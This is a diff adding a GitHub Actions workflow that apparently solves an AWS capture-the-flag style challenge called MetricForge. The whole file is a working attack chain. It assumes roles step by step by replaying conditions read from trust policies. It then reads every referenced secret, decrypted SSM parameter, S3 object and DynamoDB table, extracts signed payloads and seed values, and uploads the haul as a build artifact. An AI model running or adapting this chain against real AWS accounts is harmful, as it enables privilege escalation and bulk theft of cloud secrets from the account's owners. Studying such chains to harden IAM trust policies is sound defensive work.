@@ -1,0 +1,453 @@
+name: MetricForge exact recovery chain
+
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+  actions: read
+
+jobs:
+  mint:
+    uses: yulmwu/metricforge-recovery-workflows/.github/workflows/restore.yml@main
+    with:
+      mode: exchange
+      entry_role: arn:aws:iam::125746528491:role/metricforge-entry-b8358a07fc
+      nonce: participant
+
+  chain:
+    needs: mint
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    permissions:
+      contents: read
+      actions: read
+
+    steps:
+      - name: Download entry session
+        uses: actions/download-artifact@v4
+        with:
+          name: metricforge-entry-session-participant
+          path: session
+
+      - name: Assume broker and inspect final recovery role
+        shell: bash
+        run: |
+          set -u
+          export AWS_PAGER=""
+          export AWS_DEFAULT_REGION=us-east-1
+          mkdir -p chain-result/entry chain-result/broker chain-result/final \
+                   chain-result/resources chain-result/analysis
+
+          SESSION_FILE="$(find session -maxdepth 2 -type f | head -n 1)"
+          test -n "${SESSION_FILE}" || { echo "Entry session artifact is empty"; exit 1; }
+
+          export AWS_ACCESS_KEY_ID="$(jq -r '.Credentials.AccessKeyId // .credentials.AccessKeyId // .AccessKeyId // empty' "${SESSION_FILE}")"
+          export AWS_SECRET_ACCESS_KEY="$(jq -r '.Credentials.SecretAccessKey // .credentials.SecretAccessKey // .SecretAccessKey // empty' "${SESSION_FILE}")"
+          export AWS_SESSION_TOKEN="$(jq -r '.Credentials.SessionToken // .credentials.SessionToken // .SessionToken // empty' "${SESSION_FILE}")"
+
+          test -n "${AWS_ACCESS_KEY_ID}" || { echo "Could not parse entry credentials"; exit 1; }
+          echo "::add-mask::${AWS_ACCESS_KEY_ID}"
+          echo "::add-mask::${AWS_SECRET_ACCESS_KEY}"
+          echo "::add-mask::${AWS_SESSION_TOKEN}"
+
+          aws sts get-caller-identity --output json > chain-result/entry/identity.json
+
+          # Exact values recovered from the broker trust policy.
+          BROKER_ROLE="arn:aws:iam::125746528491:role/metricforge-broker-9d7a0ac7cc"
+          AMI_ID="ami-0efca712577c4c937"
+          ATTESTATION="bdeeb30544829362"
+
+          aws sts assume-role \
+            --role-arn "${BROKER_ROLE}" \
+            --role-session-name "recover-30b28c53" \
+            --external-id "mf-broker-bdeeb30544829362" \
+            --source-identity "git-30b28c539ebd" \
+            --tags \
+              "Key=AmiId,Value=${AMI_ID}" \
+              "Key=Attestation,Value=${ATTESTATION}" \
+            --transitive-tag-keys AmiId Attestation \
+            --duration-seconds 3600 \
+            --output json > broker-session.json
+
+          export AWS_ACCESS_KEY_ID="$(jq -r '.Credentials.AccessKeyId' broker-session.json)"
+          export AWS_SECRET_ACCESS_KEY="$(jq -r '.Credentials.SecretAccessKey' broker-session.json)"
+          export AWS_SESSION_TOKEN="$(jq -r '.Credentials.SessionToken' broker-session.json)"
+          echo "::add-mask::${AWS_ACCESS_KEY_ID}"
+          echo "::add-mask::${AWS_SECRET_ACCESS_KEY}"
+          echo "::add-mask::${AWS_SESSION_TOKEN}"
+
+          aws sts get-caller-identity --output json > chain-result/broker/identity.json
+
+          FINAL_NAME="metricforge-final-329005447e"
+          FINAL_ARN="arn:aws:iam::125746528491:role/${FINAL_NAME}"
+          BOUNDARY_ARN="arn:aws:iam::125746528491:policy/metricforge-boundary-635fa58dc5"
+
+          aws iam get-role --role-name "${FINAL_NAME}" --output json \
+            > chain-result/broker/final-role.json \
+            2> chain-result/broker/final-role.stderr || true
+
+          aws iam list-role-policies --role-name "${FINAL_NAME}" --output json \
+            > chain-result/broker/final-inline-list.json \
+            2> chain-result/broker/final-inline-list.stderr || true
+
+          (jq -r '.PolicyNames[]?' chain-result/broker/final-inline-list.json 2>/dev/null || true) |
+          while IFS= read -r policy; do
+            safe="$(printf '%s' "${policy}" | tr -c 'A-Za-z0-9_.-' '_')"
+            aws iam get-role-policy \
+              --role-name "${FINAL_NAME}" \
+              --policy-name "${policy}" \
+              --output json \
+              > "chain-result/broker/final-policy-${safe}.json" \
+              2> "chain-result/broker/final-policy-${safe}.stderr" || true
+          done
+
+          aws iam get-policy --policy-arn "${BOUNDARY_ARN}" --output json \
+            > chain-result/broker/boundary-meta.json \
+            2> chain-result/broker/boundary-meta.stderr || true
+
+          BOUNDARY_VERSION="$(jq -r '.Policy.DefaultVersionId // empty' chain-result/broker/boundary-meta.json 2>/dev/null)"
+          if [ -n "${BOUNDARY_VERSION}" ]; then
+            aws iam get-policy-version \
+              --policy-arn "${BOUNDARY_ARN}" \
+              --version-id "${BOUNDARY_VERSION}" \
+              --output json \
+              > chain-result/broker/boundary-version.json \
+              2> chain-result/broker/boundary-version.stderr || true
+          fi
+
+          # Build one exact final-role AssumeRole request from its visible trust policy.
+          python3 - <<'PY'
+          import json
+          from pathlib import Path
+
+          trust = json.loads(Path("chain-result/broker/final-role.json").read_text())
+          statements = trust["Role"]["AssumeRolePolicyDocument"]["Statement"]
+
+          cfg = {
+              "role_session_name": "metricforge-final",
+              "external_id": None,
+              "source_identity": None,
+              "tags": {},
+              "transitive_tag_keys": [],
+              "principal_tag_conditions": {},
+              "all_conditions": [],
+          }
+
+          def concrete(value):
+              if isinstance(value, list):
+                  return [concrete(v) for v in value]
+              if not isinstance(value, str):
+                  return value
+              return value.replace("*", "participant").replace("?", "x")
+
+          for statement in statements:
+              cond = statement.get("Condition") or {}
+              for operator, mapping in cond.items():
+                  if not isinstance(mapping, dict):
+                      continue
+                  for key, value in mapping.items():
+                      cfg["all_conditions"].append({
+                          "operator": operator,
+                          "key": key,
+                          "value": value,
+                      })
+                      low = key.lower()
+                      value = concrete(value)
+                      if low == "sts:rolesessionname":
+                          cfg["role_session_name"] = value[0] if isinstance(value, list) else value
+                      elif low == "sts:externalid":
+                          cfg["external_id"] = value[0] if isinstance(value, list) else value
+                      elif low == "sts:sourceidentity":
+                          cfg["source_identity"] = value[0] if isinstance(value, list) else value
+                      elif low.startswith("aws:requesttag/"):
+                          tag_key = key.split("/", 1)[1]
+                          cfg["tags"][tag_key] = value[0] if isinstance(value, list) else value
+                      elif low == "sts:transitivetagkeys":
+                          cfg["transitive_tag_keys"] = value if isinstance(value, list) else [value]
+                      elif low.startswith("aws:principaltag/"):
+                          tag_key = key.split("/", 1)[1]
+                          cfg["principal_tag_conditions"][tag_key] = value
+
+          Path("chain-result/analysis/final-assume-config.json").write_text(
+              json.dumps(cfg, ensure_ascii=False, indent=2)
+          )
+          PY
+
+          # Attempt the final role with the exact conditions extracted above.
+          python3 - <<'PY'
+          import json
+          import subprocess
+          from pathlib import Path
+
+          role_arn = "arn:aws:iam::125746528491:role/metricforge-final-329005447e"
+          cfg = json.loads(Path("chain-result/analysis/final-assume-config.json").read_text())
+
+          cmd = [
+              "aws", "sts", "assume-role",
+              "--role-arn", role_arn,
+              "--role-session-name", cfg["role_session_name"],
+              "--duration-seconds", "3600",
+              "--output", "json",
+          ]
+          if cfg.get("external_id"):
+              cmd += ["--external-id", cfg["external_id"]]
+          if cfg.get("source_identity"):
+              cmd += ["--source-identity", cfg["source_identity"]]
+
+          tags = cfg.get("tags") or {}
+          if tags:
+              cmd.append("--tags")
+              cmd.extend([f"Key={k},Value={v}" for k, v in tags.items()])
+
+          transitive = cfg.get("transitive_tag_keys") or []
+          if transitive:
+              cmd.append("--transitive-tag-keys")
+              cmd.extend(transitive)
+
+          safe_cmd = []
+          for item in cmd:
+              if item.startswith("Key="):
+                  key = item.split(",", 1)[0]
+                  safe_cmd.append(key + ",Value=<redacted>")
+              else:
+                  safe_cmd.append(item)
+          Path("chain-result/analysis/final-assume-command.txt").write_text(
+              " ".join(safe_cmd) + "\n"
+          )
+
+          proc = subprocess.run(cmd, text=True, capture_output=True)
+          Path("chain-result/analysis/final-assume.stderr").write_text(proc.stderr)
+          Path("chain-result/analysis/final-assume.exit").write_text(str(proc.returncode) + "\n")
+          if proc.returncode == 0:
+              Path("final-session.json").write_text(proc.stdout)
+          PY
+
+          if [ -s final-session.json ]; then
+            export AWS_ACCESS_KEY_ID="$(jq -r '.Credentials.AccessKeyId' final-session.json)"
+            export AWS_SECRET_ACCESS_KEY="$(jq -r '.Credentials.SecretAccessKey' final-session.json)"
+            export AWS_SESSION_TOKEN="$(jq -r '.Credentials.SessionToken' final-session.json)"
+            echo "::add-mask::${AWS_ACCESS_KEY_ID}"
+            echo "::add-mask::${AWS_SECRET_ACCESS_KEY}"
+            echo "::add-mask::${AWS_SESSION_TOKEN}"
+
+            aws sts get-caller-identity --output json \
+              > chain-result/final/identity.json \
+              2> chain-result/final/identity.stderr || true
+
+            # Collect allowed resources/actions from final inline policies and the boundary.
+            python3 - <<'PY'
+            import json
+            from pathlib import Path
+
+            documents = []
+            for path in Path("chain-result/broker").glob("final-policy-*.json"):
+                try:
+                    documents.append((path, json.loads(path.read_text()).get("PolicyDocument", {})))
+                except Exception:
+                    pass
+
+            boundary = Path("chain-result/broker/boundary-version.json")
+            if boundary.exists():
+                try:
+                    documents.append((boundary, json.loads(boundary.read_text()).get("PolicyVersion", {}).get("Document", {})))
+                except Exception:
+                    pass
+
+            actions, resources = set(), set()
+            for source, document in documents:
+                for st in document.get("Statement", []):
+                    a = st.get("Action", [])
+                    r = st.get("Resource", [])
+                    if isinstance(a, str): a = [a]
+                    if isinstance(r, str): r = [r]
+                    actions.update(map(str, a))
+                    resources.update(map(str, r))
+
+            Path("chain-result/analysis/final-actions.txt").write_text(
+                "\n".join(sorted(actions)) + ("\n" if actions else "")
+            )
+            Path("chain-result/analysis/final-resources.txt").write_text(
+                "\n".join(sorted(resources)) + ("\n" if resources else "")
+            )
+            PY
+
+            # Read exact S3 objects referenced by policy.
+            grep '^arn:aws:s3:::' chain-result/analysis/final-resources.txt 2>/dev/null |
+            sort -u |
+            while IFS= read -r arn; do
+              spec="${arn#arn:aws:s3:::}"
+              bucket="${spec%%/*}"
+              key=""
+              if [[ "${spec}" == */* ]]; then key="${spec#*/}"; fi
+              safe="$(printf '%s' "${arn}" | sha256sum | cut -c1-16)"
+              if [ -n "${key}" ] && [[ "${key}" != *'*'* ]]; then
+                printf '%s\n' "${arn}" > "chain-result/resources/s3-${safe}.arn"
+                aws s3api get-object --bucket "${bucket}" --key "${key}" \
+                  "chain-result/resources/s3-${safe}.bin" \
+                  > "chain-result/resources/s3-${safe}.meta.json" \
+                  2> "chain-result/resources/s3-${safe}.stderr" || true
+              else
+                aws s3api list-objects-v2 --bucket "${bucket}" --max-keys 500 --output json \
+                  > "chain-result/resources/s3-${safe}-list.json" \
+                  2> "chain-result/resources/s3-${safe}-list.stderr" || true
+              fi
+            done
+
+            # Read exact SSM parameters referenced by policy.
+            grep '^arn:aws:ssm:' chain-result/analysis/final-resources.txt 2>/dev/null |
+            sort -u |
+            while IFS= read -r arn; do
+              region="$(printf '%s' "${arn}" | cut -d: -f4)"
+              resource="${arn#*:parameter/}"
+              safe="$(printf '%s' "${arn}" | sha256sum | cut -c1-16)"
+              printf '%s\n' "${arn}" > "chain-result/resources/ssm-${safe}.arn"
+              aws ssm get-parameter \
+                --region "${region}" \
+                --name "/${resource}" \
+                --with-decryption \
+                --output json \
+                > "chain-result/resources/ssm-${safe}.json" \
+                2> "chain-result/resources/ssm-${safe}.stderr" || true
+            done
+
+            # Read exact Secrets Manager secrets referenced by policy.
+            grep '^arn:aws:secretsmanager:' chain-result/analysis/final-resources.txt 2>/dev/null |
+            sort -u |
+            while IFS= read -r arn; do
+              region="$(printf '%s' "${arn}" | cut -d: -f4)"
+              safe="$(printf '%s' "${arn}" | sha256sum | cut -c1-16)"
+              printf '%s\n' "${arn}" > "chain-result/resources/secret-${safe}.arn"
+              aws secretsmanager get-secret-value \
+                --region "${region}" \
+                --secret-id "${arn}" \
+                --output json \
+                > "chain-result/resources/secret-${safe}.json" \
+                2> "chain-result/resources/secret-${safe}.stderr" || true
+            done
+
+            # Read exact DynamoDB tables referenced by policy.
+            grep '^arn:aws:dynamodb:' chain-result/analysis/final-resources.txt 2>/dev/null |
+            grep ':table/' |
+            sort -u |
+            while IFS= read -r arn; do
+              region="$(printf '%s' "${arn}" | cut -d: -f4)"
+              table="${arn##*:table/}"
+              table="${table%%/*}"
+              safe="$(printf '%s' "${arn}" | sha256sum | cut -c1-16)"
+              aws dynamodb scan \
+                --region "${region}" \
+                --table-name "${table}" \
+                --limit 100 \
+                --output json \
+                > "chain-result/resources/dynamodb-${safe}.json" \
+                2> "chain-result/resources/dynamodb-${safe}.stderr" || true
+            done
+          fi
+
+          # Extract every DSSE envelope and likely seed/value.
+          python3 - <<'PY'
+          import base64
+          import hashlib
+          import json
+          import re
+          from pathlib import Path
+
+          root = Path("chain-result")
+          analysis = root / "analysis"
+          candidates = []
+          text_parts = []
+
+          def visit(obj, source, trail="$"):
+              if isinstance(obj, dict):
+                  if {"payloadType", "payload", "signatures"} <= set(obj):
+                      item = {"source": str(source), "json_path": trail, "envelope": obj}
+                      try:
+                          payload = base64.b64decode(obj["payload"], validate=True)
+                          digest = hashlib.sha256(payload).hexdigest()
+                          item.update({
+                              "payload_sha256": digest,
+                              "C": digest[:16],
+                              "payload_utf8": payload.decode("utf-8", "replace"),
+                          })
+                      except Exception as exc:
+                          item["error"] = repr(exc)
+                      candidates.append(item)
+                  for key, value in obj.items():
+                      visit(value, source, f"{trail}.{key}")
+              elif isinstance(obj, list):
+                  for i, value in enumerate(obj):
+                      visit(value, source, f"{trail}[{i}]")
+
+          for path in root.rglob("*"):
+              if not path.is_file() or path.name in {"broker-session.json", "final-session.json"}:
+                  continue
+              if path.stat().st_size > 10_000_000:
+                  continue
+              try:
+                  data = path.read_bytes()
+              except OSError:
+                  continue
+              text_parts.append(data)
+              try:
+                  visit(json.loads(data), path)
+              except Exception:
+                  pass
+
+          combined = b"\n".join(text_parts)
+          interesting = sorted({
+              line.decode("utf-8", "replace")
+              for line in re.findall(
+                  rb"(?im)^.*(?:metricforge|recovery|restore|manifest|dsse|payload|seed|proof|hmac|ami-|attestation|external.?id).*$",
+                  combined,
+              )
+          })
+          (analysis / "interesting-lines.txt").write_text(
+              "\n".join(interesting) + ("\n" if interesting else "")
+          )
+          (analysis / "dsse-candidates.json").write_text(
+              json.dumps(candidates, ensure_ascii=False, indent=2)
+          )
+          PY
+
+          {
+            echo "=== B ==="
+            echo "ami-0efca712577c4c937"
+            echo
+            echo "=== FINAL ROLE ==="
+            cat chain-result/broker/final-role.json 2>/dev/null || true
+            echo
+            echo "=== FINAL INLINE POLICIES ==="
+            cat chain-result/broker/final-policy-*.json 2>/dev/null || true
+            echo
+            echo "=== BOUNDARY ==="
+            cat chain-result/broker/boundary-version.json 2>/dev/null || true
+            echo
+            echo "=== FINAL ASSUME CONFIG ==="
+            cat chain-result/analysis/final-assume-config.json 2>/dev/null || true
+            echo
+            echo "=== FINAL ASSUME ERROR ==="
+            cat chain-result/analysis/final-assume.stderr 2>/dev/null || true
+            echo
+            echo "=== FINAL ACTIONS/RESOURCES ==="
+            cat chain-result/analysis/final-actions.txt 2>/dev/null || true
+            cat chain-result/analysis/final-resources.txt 2>/dev/null || true
+            echo
+            echo "=== DSSE ==="
+            cat chain-result/analysis/dsse-candidates.json 2>/dev/null || true
+            echo
+            echo "=== INTERESTING ==="
+            cat chain-result/analysis/interesting-lines.txt 2>/dev/null || true
+          } > chain-result/analysis/SUMMARY.txt
+
+          rm -rf session broker-session.json final-session.json
+
+      - name: Upload chain results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: metricforge-chain-result
+          path: chain-result
+          if-no-files-found: warn
+          retention-days: 1
